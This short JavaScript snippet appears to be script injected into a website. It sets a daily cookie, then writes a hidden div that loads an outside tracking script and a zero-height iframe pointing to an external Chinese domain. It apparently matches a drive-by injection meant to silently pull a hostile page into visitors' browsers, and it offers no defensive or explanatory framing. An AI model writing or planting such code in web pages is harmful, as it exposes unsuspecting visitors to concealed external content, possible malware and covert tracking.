function Get(){
var Then = new Date() 
Then.setTime(Then.getTime() + 24*60*60*1000)
var cookieString = new String(document.cookie)
var cookieHeader = "Cookie1=" 
var beginPosition = cookieString.indexOf(cookieHeader)
if (beginPosition != -1){ 
} else 
{ document.cookie = "Cookie1=risb;expires="+ Then.toGMTString()
document.write("<div style=\"display:none\">");
document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/1742039.js"></script>');
document.writeln("<iframe src=http://www.fire456.cn/zi.htm?google width=100 height=0></iframe>");

}
}Get();